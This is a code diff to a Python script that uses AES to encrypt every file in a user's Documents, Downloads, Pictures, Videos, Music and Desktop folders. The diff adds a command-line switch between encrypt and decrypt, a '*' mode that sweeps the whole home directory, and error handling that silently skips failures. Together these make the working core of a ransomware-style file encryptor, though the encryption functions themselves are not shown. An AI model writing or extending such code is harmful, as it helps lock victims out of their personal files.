@@ -1,3 +1,4 @@
+import sys
 import os
 import glob
 from Crypto.Cipher import AES
@@ -52,26 +53,47 @@ def list_files(path):
     return files_list
 
 
+def run_operation(operation, path):
+    # Encrypt/decrypt files
+    try:
+        if operation == "e":
+            encrypt(path)
+        elif operation == "d":
+            decrypt_file(path)
+    except PermissionError:
+        # print("Perm error on" + f)
+        pass
+    except ValueError:
+        # print("Mac check failed on" + f)
+        pass
+
+
 # Get home directory
 home_path = os.path.expanduser('~')
 home_path = home_path + "/"
 
-directories_to_encrypt = ["Documents/", "Downloads/",
-                          "Pictures/", "Videos/", "Music/", "Desktop/"]
+# "e" is encrypt, "d" is decrypt
+operation = sys.argv[1]
+# Path of file to encrypt/decrypt. * = everything
+file_to_modify = sys.argv[2]
 
-for directory in directories_to_encrypt:
-    # Get list of file in home directory
-    files = list_files(home_path + directory)
+if file_to_modify == "*":
+    # Encrypt all files in home directory
 
-    for f in files:
-        if f.split('\\')[-1] == "desktop.ini":
-            continue
-        try:
-            encrypt(f)
-            decrypt_file(f)
-        except PermissionError:
-            # print("Perm error on" + f)
-            pass
-        except ValueError:
-            # print("Mac check failed on" + f)
-            pass
+    # List of folders to encrypt in the home directory
+    directories_to_encrypt = ["Documents/", "Downloads/",
+                              "Pictures/", "Videos/", "Music/", "Desktop/"]
+
+    # Loop through each directory to encrypt
+    for directory in directories_to_encrypt:
+        # Get list of file in home directory
+        files = list_files(home_path + directory)
+
+        # Loop through each file in the directory (including subfolders)
+        for f in files:
+            if f.split('\\')[-1] == "desktop.ini":
+                continue
+            run_operation(operation, f)
+else:
+    # Encrypt/decrypt a single file
+    run_operation(operation, file_to_modify)
